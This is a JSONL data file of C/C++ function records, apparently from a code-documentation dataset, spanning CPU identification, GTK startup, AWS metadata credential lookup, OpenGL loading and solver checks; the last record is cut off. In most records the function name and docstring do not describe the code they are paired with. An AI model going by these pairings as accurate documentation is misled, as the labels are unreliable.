{"content":"{'function_name': 'x86GetNexGenId', 'docstring': '\/* - Basic identification -\\n  ** ID = 0x500x : Nx586\\n  *\/', 'code': 'static u32 x86GetCentaurId(u32 maxfunc)\\n{\\n  \/* - Basic identification -\\n  ** ID = 0x504x : IDT WinChip C6 \/ Centaur C2\\n  ** ID = 0x508x : IDT WinChip 2 \/ Centaur C3\\n  ** ID = 0x509x : IDT WinChip 3 \/ Centaur C6\\n  ** ID = 0x606x : VIA C3 Samuel\\n  ** ID = 0x607x : VIA C3 Samuel 2 \/ VIA Eden ESP (Ezra)\\n  ** ID = 0x608x : VIA C3 Ezra-T\\n  ** ID = 0x609x : VIA C3 Nehemia \/ VIA C3-M Nehemia\\n  **             \/ VIA Eden ESP (Ezra\/Nehemia) \/ VIA Antaur\\n  ** ID = 0x60Ax : VIA C7 Esther\\n  *\/\\n  return x86GetDefaultId(maxfunc) | (VENDOR_CENTAUR << 28);\\n}'}","id":3739}
{"content":"{'function_name': 'create_interface', 'docstring': '\/\/ this is, more or less, GLADE-generated code', 'code': 'int main( int argc, char *argv[] )\\n{\\n\\n    \/\/ initialise network\\n    Network::init();\\n\\n    \/\/ read config file (override defaults, possibly)\\n    _property.fromConfigFile(_property.find(\"propertyFileName\").asString().c_str(),false);\\n\\n    \/\/ open ports\\n    if ( openPorts() == false ) {\\n        return 1;\\n    }\\n\\n    \/\/ initialise GTK & create interface\\n    gtk_init (&argc, &argv);\\n    create_interface ();\\n\\n    \/\/ idle and wait for events\\n    gtk_main ();\\n\\n    \/\/ possibly, stop the threads if they are hanging (i.e., the user pressed the\\n    \/\/ KILL button without stopping streaming or shutting down\\n    if ( numDataStreamingThread.isRunning() ) numDataStreamingThread.stop();\\n    if ( img0StreamingThread.isRunning() ) img0StreamingThread.stop();\\n    if ( img1StreamingThread.isRunning() ) img1StreamingThread.stop();\\n    if ( pollingThread.isRunning() ) pollingThread.stop();\\n\\n    \/\/ bail out\\n    closePorts();\\n    Network::fini();\\n\\n    return 0;\\n\\n}'}","id":3742}
{"content":"{'function_name': 'FetchRegion', 'docstring': '\/\/ last character to return the region.', 'code': 'StatusOr<ExternalAccountTokenSourceAwsSecrets> FetchSecrets(\\n    ExternalAccountTokenSourceAwsInfo const& info,\\n    std::string const& metadata_token, HttpClientFactory const& cf,\\n    Options const& opts, internal::ErrorContext const& ec) {\\n  auto access_key_id_env = internal::GetEnv(\"AWS_ACCESS_KEY_ID\");\\n  auto secret_access_key_env = internal::GetEnv(\"AWS_SECRET_ACCESS_KEY\");\\n  if (access_key_id_env.has_value() && secret_access_key_env.has_value()) {\\n    auto session_token_env = internal::GetEnv(\"AWS_SESSION_TOKEN\");\\n    return ExternalAccountTokenSourceAwsSecrets{\\n        \/*access_key_id=*\/std::move(*access_key_id_env),\\n        \/*secret_access_key=*\/std::move(*secret_access_key_env),\\n        \/*session_token=*\/session_token_env.value_or(\"\")};\\n  }\\n\\n  \/\/ This code fetches the security credentials from the metadata services in an\\n  \/\/ AWS EC2 instance, i.e., a VM. The requests and responses are documented in:\\n  \/\/  https:\/\/docs.aws.amazon.com\/AWSEC2\/latest\/UserGuide\/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials\\n  auto role = GetMetadata(info.url, metadata_token, cf, opts);\\n  if (!role) return std::move(role).status();\\n  auto path = info.url;\\n  if (path.back() != \\'\/\\') path.push_back(\\'\/\\');\\n  path.append(*role);\\n  auto secrets = GetMetadata(path, metadata_token, cf, opts);\\n  if (!secrets) return std::move(secrets).status();\\n  auto json = nlohmann::json::parse(*secrets, nullptr, false);\\n  if (!json.is_object()) {\\n    return InvalidArgumentError(\\n        absl::StrCat(\"cannot parse AWS security-credentials metadata as JSON\"),\\n        GCP_ERROR_INFO()\\n            .WithContext(ec)\\n            .WithMetadata(\"aws.role\", *role)\\n            .WithMetadata(\"aws.metadata.path\", path));\\n  }\\n  auto name = absl::string_view{\"aws-security-credentials-response\"};\\n  auto access_key_id = ValidateStringField(json, \"AccessKeyId\", name, ec);\\n  if (!access_key_id) return std::move(access_key_id).status();\\n  auto secret_access_key =\\n      ValidateStringField(json, \"SecretAccessKey\", name, ec);\\n  if (!secret_access_key) return std::move(secret_access_key).status();\\n  auto session_token = ValidateStringField(json, \"Token\", name, ec);\\n  if (!session_token) return std::move(session_token).status();\\n\\n  return ExternalAccountTokenSourceAwsSecrets{\\n      \/*access_key_id=*\/*std::move(access_key_id),\\n      \/*secret_access_key=*\/*std::move(secret_access_key),\\n      \/*session_token=*\/*std::move(session_token)};\\n}'}","id":3745}
{"content":"{'function_name': 'menu', 'docstring': '\/\/remember to protect from divide by zero error for this selection', 'code': 'string userFile(string fN)\\n{\\n    \/\/declare variables\\n    \\n    ifstream infile; \/\/this will be the variable to open files that already exist and read data from them\\n    ofstream outfile; \/\/this will be the variable to create non-existent files and write to them\\n    string fileName = fN; \/\/this variable takes on the value of the passed argument from the menu function\\n    string data; \/\/to hold data from file to display stats\\n\\n    infile.open((fileName + \".txt\").c_str()); \/\/concat the user defined name to open\/create a text file for the user.\\n    \\n    if (infile)\\n    {\\n        cout << \"              Let\\'s play, \" << endl;\\n        cout << \"                 \" << fileName << \"!\" << endl;\\n        infile.close();\\n        outfile.open((fileName + \".txt\").c_str());\\n        mainMenu();\\n        \\n    }\\n    else\\n    {\\n        cout << \"Your user name does not exist, but a new user & file shall be created for you.\" << endl;\\n        cout << endl;\\n        outfile.open ((fileName + \".txt\").c_str());\\n        outfile << \"Writing to the newly created file\\\\n\";\\n        cout << \"Current Statistics:\" << endl;\\n        outfile.close();\\n        infile.open((fileName + \".txt\").c_str());\\n        while (!infile.eof())\\n        {\\n            getline(infile,data);\\n            cout << data << endl;\\n        }\\n        \\n        mainMenu();\\n        \\n    }\\n\\n\\n    return fileName;\\n}'}","id":3747}
{"content":"{'function_name': 'DECL_LOADGLEXT_PROC', 'docstring': '\/\/ Duplicate in GL_ARB_separate_shader_objects', 'code': 'static bool DECL_LOADGLEXT_PROC(ARB_separate_shader_objects)\\n{\\n    LOAD_GLPROC( glUseProgramStages          );\\n    LOAD_GLPROC( glActiveShaderProgram       );\\n    LOAD_GLPROC( glCreateShaderProgramv      );\\n    LOAD_GLPROC( glBindProgramPipeline       );\\n    LOAD_GLPROC( glDeleteProgramPipelines    );\\n    LOAD_GLPROC( glGenProgramPipelines       );\\n    LOAD_GLPROC( glIsProgramPipeline         );\\n    LOAD_GLPROC( glProgramParameteri         ); \/\/ Duplicate in GL_ARB_get_program_binary\\n    LOAD_GLPROC( glGetProgramPipelineiv      );\\n    LOAD_GLPROC( glProgramUniform1i          );\\n    LOAD_GLPROC( glProgramUniform2i          );\\n    LOAD_GLPROC( glProgramUniform3i          );\\n    LOAD_GLPROC( glProgramUniform4i          );\\n    LOAD_GLPROC( glProgramUniform1ui         );\\n    LOAD_GLPROC( glProgramUniform2ui         );\\n    LOAD_GLPROC( glProgramUniform3ui         );\\n    LOAD_GLPROC( glProgramUniform4ui         );\\n    LOAD_GLPROC( glProgramUniform1f          );\\n    LOAD_GLPROC( glProgramUniform2f          );\\n    LOAD_GLPROC( glProgramUniform3f          );\\n    LOAD_GLPROC( glProgramUniform4f          );\\n    LOAD_GLPROC( glProgramUniform1d          );\\n    LOAD_GLPROC( glProgramUniform2d          );\\n    LOAD_GLPROC( glProgramUniform3d          );\\n    LOAD_GLPROC( glProgramUniform4d          );\\n    LOAD_GLPROC( glProgramUniform1iv         );\\n    LOAD_GLPROC( glProgramUniform2iv         );\\n    LOAD_GLPROC( glProgramUniform3iv         );\\n    LOAD_GLPROC( glProgramUniform4iv         );\\n    LOAD_GLPROC( glProgramUniform1uiv        );\\n    LOAD_GLPROC( glProgramUniform2uiv        );\\n    LOAD_GLPROC( glProgramUniform3uiv        );\\n    LOAD_GLPROC( glProgramUniform4uiv        );\\n    LOAD_GLPROC( glProgramUniform1fv         );\\n    LOAD_GLPROC( glProgramUniform2fv         );\\n    LOAD_GLPROC( glProgramUniform3fv         );\\n    LOAD_GLPROC( glProgramUniform4fv         );\\n    LOAD_GLPROC( glProgramUniform1dv         );\\n    LOAD_GLPROC( glProgramUniform2dv         );\\n    LOAD_GLPROC( glProgramUniform3dv         );\\n    LOAD_GLPROC( glProgramUniform4dv         );\\n    LOAD_GLPROC( glProgramUniformMatrix2fv   );\\n    LOAD_GLPROC( glProgramUniformMatrix3fv   );\\n    LOAD_GLPROC( glProgramUniformMatrix4fv   );\\n    LOAD_GLPROC( glProgramUniformMatrix2dv   );\\n    LOAD_GLPROC( glProgramUniformMatrix3dv   );\\n    LOAD_GLPROC( glProgramUniformMatrix4dv   );\\n    LOAD_GLPROC( glProgramUniformMatrix2x3fv );\\n    LOAD_GLPROC( glProgramUniformMatrix3x2fv );\\n    LOAD_GLPROC( glProgramUniformMatrix2x4fv );\\n    LOAD_GLPROC( glProgramUniformMatrix4x2fv );\\n    LOAD_GLPROC( glProgramUniformMatrix3x4fv );\\n    LOAD_GLPROC( glProgramUniformMatrix4x3fv );\\n    LOAD_GLPROC( glProgramUniformMatrix2x3dv );\\n    LOAD_GLPROC( glProgramUniformMatrix3x2dv );\\n    LOAD_GLPROC( glProgramUniformMatrix2x4dv );\\n    LOAD_GLPROC( glProgramUniformMatrix4x2dv );\\n    LOAD_GLPROC( glProgramUniformMatrix3x4dv );\\n    LOAD_GLPROC( glProgramUniformMatrix4x3dv );\\n    LOAD_GLPROC( glValidateProgramPipeline   );\\n    LOAD_GLPROC( glGetProgramPipelineInfoLog );\\n    return true;\\n}'}","id":3750}
{"content":"{'function_name': 'reguser_kvs_fnc_match', 'docstring': '\/\/KviRegisteredUser * u = c->context()->connection()->userDataBase()->registeredUser(mask.nick(),mask.user(),mask.host());', 'code': 'static bool reguser_kvs_fnc_matchProperty(KviKvsModuleFunctionCall * c)\\n{\\n\\tQString szMask;\\n\\tQString szProperty;\\n\\tKVSM_PARAMETERS_BEGIN(c)\\n\\t\\tKVSM_PARAMETER(\"user_mask\",KVS_PT_STRING,0,szMask)\\n\\t\\tKVSM_PARAMETER(\"property_name\",KVS_PT_STRING,KVS_PF_OPTIONAL,szProperty)\\n\\tKVSM_PARAMETERS_END(c)\\n\\n\\tKviIrcMask mask(szMask);\\n\\t\/\/FIXME: it crashes kvirc\\n\\t\/\/KviRegisteredUser * u = c->context()->connection()->userDataBase()->registeredUser(mask.nick(),mask.user(),mask.host());\\n\\tKviRegisteredUser * u = g_pRegisteredUserDataBase->findMatchingUser(mask.nick(),mask.user(),mask.host());\\n\\tif(u)\\n\\t{\\n\\t\\tQString tmp;\\n\\t\\tu->getProperty(szProperty,tmp);\\n\\t\\tc->returnValue()->setString(tmp);\\n\\t}\\n\\treturn true;\\n}'}","id":3754}
{"content":"{'function_name': 'IsRemainLoopValid', 'docstring': '\/\/ \u8ba1\u7b97UnBlank\u548cBlank\u4e4b\u95f4\u6700\u5c0f\u8ddd\u79bb\u7684\u6700\u5927\u503c', 'code': 'BOOL\\tIsBlindContour( CSmartLoop *Contour, double dRadius )\\n{\\n\\tif( !Contour ) return TRUE ;\\n\\t\/\/ \u6d88\u9664\u52a0\u5de5\u4e2d\u7684\u76f2\u533a\\n\\tdouble dDia = dRadius * 2 ;\\n\\tif( dDia > 0.05 && \\n\\t\\tContour->m_dBox[1][0] - Contour->m_dBox[0][0] < dDia &&\\n\\t\\tContour->m_dBox[1][1] - Contour->m_dBox[0][1] < dDia )\\n\\t{\\n\\t\\t\/\/ \u534a\u5f84\u8fc7\u6ee4\\n\\t\\tCSmartSect *pSect = Contour->GetSectHead() ;\\n\\t\\tfor( ; pSect ; pSect = pSect->next ) \\n\\t\\t{\\n\\t\\t\\tif( pSect->m_bEndFlag & NC_BLANK_SECT )\\n\\t\\t\\t\\tbreak ;\\n\\t\\t}\\n\\t\\tif( pSect == NULL )\\n\\t\\t{\\n\\t\\t\\t\/\/ \u6ca1\u6709\u53d1\u73b0\u6bdb\u576f\u8fb9\u754c\u8fc7\u6ee4\u6210\u529f\\n\\t\\t\\treturn TRUE ;\\n\\t\\t}\\n\\t}\\n\\t\\n\\treturn FALSE ;\\n}'}","id":3755}
{"content":"{'function_name': 'MimeOleGenerateCID', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleGenerateMID(LPSTR pszMID, ULONG cchMax, boolean fAbsolute)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    ULONG           cch;\\r\\n    FILETIME        ft;\\r\\n    SYSTEMTIME      st;\\r\\n    WORD            wCounter;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pszMID || cchMax < CCHMAX_MID)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Get Current Time\\r\\n    GetSystemTime(&st);\\r\\n\\r\\n    \/\/ Convert to FileTime\\r\\n    SystemTimeToFileTime(&st, &ft);\\r\\n\\r\\n    \/\/ Build MessageID\\r\\n    if (FALSE == fAbsolute)\\r\\n        cch = wnsprintfA(pszMID, cchMax, \"<%04x%08.8lx$%08.8lx$%s@%s>\", DwCounterNext(), ft.dwHighDateTime, ft.dwLowDateTime, (LPTSTR)SzGetLocalPackedIP(), PszGetDomainName());\\r\\n    else\\r\\n        cch = wnsprintfA(pszMID, cchMax, \"MID:%04x%08.8lx$%08.8lx$%s@%s\", DwCounterNext(), ft.dwHighDateTime, ft.dwLowDateTime, (LPTSTR)SzGetLocalPackedIP(), PszGetDomainName());\\r\\n\\r\\n    \/\/ Buffer Overwrite\\r\\n    Assert(cch + 1 <= CCHMAX_MID);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":3756}
{"content":"{'function_name': 'unicodeToUtf8', 'docstring': \"\/*\\n     * Borrowed from LibXml2\\n     *\\n     * We are supposed to handle UTF8, check it's valid\\n     * From rfc2044: encoding of the Unicode values on UTF-8:\\n     *\\n     * UCS-4 range (hex.)           UTF-8 octet sequence (binary)\\n     * 0000 0000-0000 007F   0xxxxxxx\\n     * 0000 0080-0000 07FF   110xxxxx 10xxxxxx\\n     * 0000 0800-0000 FFFF   1110xxxx 10xxxxxx 10xxxxxx\\n     * 0001 0000-0010 FFFF   11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\\n     * 0011 0000-FFFF FFFF   not valid\\n     *\/\", 'code': 'void replaceCharReferences(char *text)\\n{\\n    struct Entity {\\n        char     d_name[6];\\n        int      d_len;\\n        unsigned d_ch;\\n    };\\n\\n    static const Entity NONE = { \"\",      0, \\'&\\'  };\\n    static const Entity LT   = { \"lt;\",   3, \\'<\\'  };\\n    static const Entity GT   = { \"gt;\",   3, \\'>\\'  };\\n    static const Entity AMP  = { \"amp;\",  4, \\'&\\'  };\\n    static const Entity APOS = { \"apos;\", 5, \\'\\\\\\'\\' };\\n    static const Entity QUOT = { \"quot;\", 5, \\'\"\\'  };\\n\\n    \/\/ Skip initial segment up to first ampersand.\\n    char *output = bsl::strchr(text, \\'&\\');\\n    if (! output) {\\n        return; \/\/ No ampersands                                      \/\/ RETURN\\n    }\\n\\n    \/\/  Loop through rest of input, looking for ampersands.\\n    \/\/  Loop invariant: *input == \\'&\\'\\n    const char* input = output;\\n    do {\\n        Entity Numeric;\\n\\n        const Entity* entity = &NONE;\\n        switch (input[1]) {\\n          case \\'l\\': entity = &LT; break;\\n          case \\'g\\': entity = &GT; break;\\n          case \\'a\\': entity = (\\'m\\' == input[2] ? &AMP : &APOS); break;\\n          case \\'q\\': entity = &QUOT; break;\\n          case \\'#\\': {\\n              \/\/ Numeric entity\\n              char *endptr = 0;\\n              unsigned c;\\n              if (\\'x\\' == input[2]) {\\n                  c = static_cast<unsigned>(\\n                                         bsl::strtoul(input + 3, &endptr, 16));\\n              }\\n              else {\\n                  c = static_cast<unsigned>(\\n                                         bsl::strtoul(input + 2, &endptr, 10));\\n              }\\n\\n              \/\/ TBD, if c is 0 or is out of unicode range, how can we report\\n              \/\/ an error?\\n\\n              if (endptr && \\';\\' == *endptr && 0 < c) {\\n                  \/\/ String has already been matched.  Consume the input and\\n                  \/\/ set the Numeric entity to match an empty string.\\n                  input = endptr;\\n                  Numeric.d_len = 0;\\n                  Numeric.d_ch = c;\\n                  entity = &Numeric;\\n              }\\n          } break;\\n          default: break;\\n        }\\n\\n        if (&Numeric == entity) {\\n\\n            output += unicodeToUtf8(output, entity->d_ch);\\n            input += entity->d_len + 1; \/\/ Always consumes at least 1 char.\\n        }\\n        else if (0 == bsl::memcmp(input + 1, entity->d_name, entity->d_len)) {\\n\\n            *output++ = toChar(entity->d_ch);\\n            input += entity->d_len + 1; \/\/ Always consumes at least 1 char.\\n        }\\n        else {\\n            \/\/ Entity not found.  Consume the ampersand unchanged.\\n            *output++ = *input++;\\n        }\\n\\n        \/\/ Copy input to output up to (but not including) the next ampersand.\\n        const char *ampersand = bsl::strchr(input, \\'&\\');\\n        bsl::size_t len = ampersand ? ampersand - input : bsl::strlen(input);\\n        bsl::memmove(output, input, len);\\n        output += len;\\n        input = ampersand;\\n\\n    } while (input);\\n\\n    *output = \\'\\\\0\\';\\n}'}","id":3761}
{"content":"{'function_name': 'IsBlindContour', 'docstring': '\/\/ \u6d88\u9664\u52a0\u5de5\u4e2d\u7684\u76f2\u533a', 'code': 'BOOL\\tSetContourHeadAtBlank(\\tCSmartLoop *AllLoop,\\t\/\/ <I> \u8f93\u5165\u6362\\n\\t\\t\\t\\t\\t\\t\\t\\tdouble\\t dist\\t,\\t\\t\/\/ <I> \u6700\u77ed\u957f\u5ea6\\n\\t\\t\\t\\t\\t\\t\\t\\tPNT3D InOutPnt )\\t\\t\/\/ <IO> \u7ed9\u5b9a\u70b9\\n{\\n\\tif( !AllLoop ) return FALSE ;\\n\\tif( !HasBlankSect( AllLoop ) )\\n\\t\\treturn FALSE ;\\n\\n\\tPNT2D tmp, find, pnt, start, end  ;\\n\\tAllLoop->m_pCurve->GetStart( pnt ) ;\\n\\tdouble dMinDist = 1.0e6, dDist = 0. ;\\n\\tCSmartCurve *pCurve = AllLoop->m_pCurve ;\\n\\tCSmartSect *pHead = pCurve->m_pHead, *pFindSect = NULL, *pNext = NULL ;\\n\\t\\n\\tpnt[0] = InOutPnt[0], pnt[1] = InOutPnt[1] ;\\n\\t\/\/ \u641c\u7d22\u5916\u8f6e\u5ed3\\n\\twhile( pHead )\\n\\t{\\n\\t\\tpNext = pHead->next ;\\n\\t\\tif( !pNext ) break ;\\n\\t\\tdDist = pHead->GetLength () ;\\n\\t\\tif( pHead->m_bEndFlag & NC_BLANK_SECT && dDist >= dist )\\n\\t\\t{\\n\\t\\t\\t\/\/ \u53d6\u6700\u8fd1\u70b9   \\n\\t\\t\\tpHead->MinDistPoint ( pnt, tmp ) ;\\n\\t\\t\\tpHead->GetStart ( start ) ;\\n\\t\\t\\tpHead->GetEnd   ( end\\t) ;\\n\\t\\t\\tif( mathDist2D( start, tmp ) < 0.01 )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpHead->GetPoint ( 0.3, tmp ) ;\\n\\t\\t\\t}\\n\\t\\t\\tif( mathDist2D( end  , tmp ) < 0.01 )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpHead->GetPoint ( 0.7, tmp ) ;\\n\\t\\t\\t}\\n\\t\\t\\tdDist = mathDist2D( tmp, InOutPnt ) ;\\n\\t\\t\\tif( dDist < dMinDist )\\n\\t\\t\\t{\\n\\t\\t\\t\\tdMinDist = dDist ;\\n\\t\\t\\t\\tpFindSect = pHead ;\\n\\t\\t\\t\\tmathCpyPnt2D( tmp, find ) ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tpHead = pNext ;\\n\\t}\\n\\tBOOL bFind = FALSE ;\\n\\tif( pFindSect )\\n\\t{\\n\\t\\tpCurve->SetStartPoint( pFindSect, find ) ;\\n\\t\\tInOutPnt[0] = find[0] ;\\n\\t\\tInOutPnt[1] = find[1] ;\\n\\t\\tbFind = TRUE ;\\n\\t}\\n\\treturn bFind ;\\n}'}","id":3770}
{"content":"{'function_name': 'move_piece', 'docstring': '\/\/ Now back on ground if we were riding..', 'code': 'void move_piece_along_route(int x, int y)\\n{\\n\\tint t, x2, y2, ox, oy;\\n\\n\\tox = x;\\n\\toy = y;\\n\\nstart:\\n\\n\\tx = ox;\\n\\ty = oy;\\n\\n\\t\/\/ Work backwards from target until we find square connecting to our creature..\\n\\tfor (t = 0 ; t < 40 ; t++)\\n\\t{\\n\\t\\tx2 = highlight_board[x][y].from_x;\\n\\t\\ty2 = highlight_board[x][y].from_y;\\n\\n\\t\\t\/\/log(\"x: %d, y: %d, x2: %d, y2: %d\", x, y, x2, y2);\\n\\n\\t\\t\/\/ Have we found connecting square to our piece?\\n\\t\\tif (x2 == board_info.selected_x && y2 == board_info.selected_y)\\n\\t\\t{\\n\\t\\t\\t\/\/log(\"moving from x2: %d, y2: %d to x: %d, y: %d\", board_info.selected_x, board_info.selected_y, x, y);\\n\\t\\t\\tmove_piece(x, y);\\n\\t\\t\\twait_time(35);\\n\\n\\t\\t\\t\/\/ Have we reached target?\\n\\t\\t\\tif (t == 0 || (board_info.selected_engaged)) return;\\n\\n\\t\\t\\tgoto start;\\n\\t\\t}\\n\\n\\t\\tx = x2;\\n\\t\\ty = y2;\\n\\n\\t}\\n}'}","id":3773}
{"content":"{'function_name': 'GyroInit', 'docstring': '\/\/not using HPF or interrupts', 'code': 'void GetMag() {\\n  i2cTimeOutStatus = I2c.read(MAG_ADDRESS, HMC5983_OUT_X_H, 6);\\n  if (i2cTimeOutCount == 10){\\n    imu.magDetected = false;\\n    return;\\n  }\\n  if (i2cTimeOutStatus != 0){\\n    i2cTimeOutCount++;\\n    return;\\n  }\\n  i2cTimeOutCount = 0;\\n  magX.buffer[1] = I2c.receive();\/\/X\\n  magX.buffer[0] = I2c.receive();\\n  magZ.buffer[1] = I2c.receive();\/\/Z\\n  magZ.buffer[0] = I2c.receive();\\n  magY.buffer[1] = I2c.receive();\/\/Y\\n  magY.buffer[0] = I2c.receive();\\n#ifdef V1\\n#ifndef EXT_MAG\\n  magY.val *= -1;\\n  magZ.val *= -1;\\n#endif\\n#endif\\n\\n  shiftedMagX  = magX.val - magOffSetX;\\n  shiftedMagY  = magY.val - magOffSetY;\\n  shiftedMagZ  = magZ.val - magOffSetZ;\\n  scaledMagX = magWInv00 * shiftedMagX + magWInv01 * shiftedMagY + magWInv02 * shiftedMagZ;\\n  scaledMagY = magWInv10 * shiftedMagX + magWInv11 * shiftedMagY + magWInv12 * shiftedMagZ;\\n  scaledMagZ = magWInv20 * shiftedMagX + magWInv21 * shiftedMagY + magWInv22 * shiftedMagZ;\\n\\n\\n  calibMagX.val = scaledMagX;\\n  calibMagY.val = scaledMagY;\\n  calibMagZ.val = scaledMagZ;\\n\\n\\n  magToFiltX = calibMagX.val;\\n  magToFiltY = calibMagY.val;\\n  magToFiltZ = calibMagZ.val;\\n\\n}'}","id":3787}
{"content":"{'function_name': 'illegalIpxStoppedIpmStatus', 'docstring': '\/\/ Cannot stop and debug - should be error return earlier', 'code': 'bool illegalIpxStoppedCrossoverStatus(const ipx::Info& ipx_info,\\n                                      const HighsOptions& options) {\\n  bool found_illegal_status = false;\\n  \/\/ Cannot stop and be optimal\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_optimal, options,\\n          \"stopped status_crossover should not be IPX_STATUS_optimal\");\\n  \/\/ Cannot stop and be imprecise\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_imprecise, options,\\n          \"stopped status_crossover should not be IPX_STATUS_imprecise\");\\n  \/\/ Cannot stop with primal infeasibility\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_primal_infeas, options,\\n          \"stopped status_crossover should not be IPX_STATUS_primal_infeas\");\\n  \/\/ Cannot stop with dual infeasibility\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_dual_infeas, options,\\n          \"stopped status_crossover should not be IPX_STATUS_dual_infeas\");\\n  \/\/ Cannot stop and reach iteration limit\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_iter_limit, options,\\n          \"stopped status_crossover should not be IPX_STATUS_iter_limit\");\\n  \/\/ Can stop and reach time limit\\n  \/\/ Cannot stop with no_progress\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_no_progress, options,\\n          \"stopped status_crossover should not be IPX_STATUS_no_progress\");\\n  \/\/ Cannot stop and failed - should be error return earlier\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_failed, options,\\n          \"stopped status_crossover should not be IPX_STATUS_failed\");\\n  \/\/ Cannot stop and debug - should be error return earlier\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_crossover == IPX_STATUS_debug, options,\\n                     \"stopped status_crossover should not be IPX_STATUS_debug\");\\n  return found_illegal_status;\\n}'}","id":3789}
{"content":"{'function_name': 'denoiseb_rd18_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd19_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd19 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_1();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3796}
{"content":"{'function_name': 'ahci_done', 'docstring': '\/\/\\tSTAILQ_INSERT_TAIL(&ch->doneq, &ccb->ccb_h, sim_links.stqe);', 'code': 'static void ahci_ch_intr(void *arg) {\\n  struct ahci_channel *ch = (struct ahci_channel *)arg;\\n  uint32_t istatus;\\n\\n  \/* Read interrupt statuses. *\/\\n  istatus = ATA_INL(ch->r_mem, AHCI_P_IS);\\n  if (istatus == 0) return;\\n\\n  mtx_lock(&ch->mtx);\\n  ahci_ch_intr_main(ch, istatus);\\n  mtx_unlock(&ch->mtx);\\n}'}","id":3797}
{"content":"{'function_name': 'srcReg', 'docstring': '\/\/ Not reachable', 'code': 'Reg dstReg(Var v)\\n{\\n  Reg r;\\n  switch (v.tag) {\\n    case UNIFORM:\\n    case QPU_NUM:\\n    case ELEM_NUM:\\n      printf(\"QPULib: writing to read-only special register is forbidden\\\\n\");\\n      assert(false);\\n    case STANDARD:\\n      r.tag   = REG_A;\\n      r.regId = v.id;\\n      return r;\\n    case TMU0_ADDR:\\n      r.tag = SPECIAL;\\n      r.regId = SPECIAL_TMU0_S;\\n      return r;\\n  }\\n\\n  \/\/ Not reachable\\n  assert(false);\\n}'}","id":3803}
{"content":"{'function_name': 'parallelCall', 'docstring': '\/\/ run step case', 'code': 'impl::sequential::unreleased_treeture<O> sequentialCall(impl::sequential::dependencies&& deps, const I& in) const {\\n\\t\\t\\t\/\/ call target function with a spawn\\n\\t\\t\\treturn detail::caller<sizeof...(Defs)-1>().template sequentialCall<O>(std::get<i>(*this),std::move(deps),in,*this);\\n\\t\\t}'}","id":3807}
{"content":"{'function_name': 'inorder', 'docstring': '\/\/ Visit right subtree', 'code': 'bool\\ntree_identical(node_t *r1, node_t *r2) {\\n  if (!r1 && !r2) \\n    return true; \/\/ both trees are NULL, identcial \\n\\n  if (r1 && r2) {  \\n    \/\/ check if both treenode data match; \\n    \/\/ left subtree and right subtree are identical\\n\\t\\treturn ((r1->data == r2->data) &&\\n\\t\\t\\t\\t\\t tree_identical(r1->left, r2->left) &&\\n\\t\\t\\t\\t\\t tree_identical(r1->right, r2->right));\\n  }\\n\\n  return false;\\n}'}","id":3808}
{"content":"{'function_name': 'leftAssoc', 'docstring': '\/\/ RS-B1', 'code': 'int main() {\\n    string input = \"ABCDEF\";\\n    string left = \"AB\";\\n    string right = \"CDEF\";\\n\\n    \/* Create AB \u22c8 CDEF *\/\\n    printf(\"Building Left Tree\\\\n\");\\n    eq_class* left_e = buildtree(left);\\n    printf(\"Building Right Tree\\\\n\");\\n    eq_class* right_e = buildtree(right);\\n\\n    node* base_node = new node();\\n    base_node->left = left_e;\\n    base_node->right = right_e;\\n\\n    \/* Create root eq node ABCDEF *\/\\n    eq_class* base = new eq_class();\\n    int hash = createHash(input);\\n    base->relations =  input;\\n    base->num_relations = 6;\\n    base->nodes.push_back(base_node);\\n    memo[hash] = base;\\n\\n    \/* Start Exploration from Base *\/\\n    printf(\"STARTING EXPLORATION\\\\n\");\\n    expandDAG(base);\\n    \/\/ exploreRSB2CF(base);\\n    \/\/ exploreRSB3CF(base);\\n    printf(\"EXPLORATION DONE\\\\n\");\\n\\n    \/* Print Memo Table Size 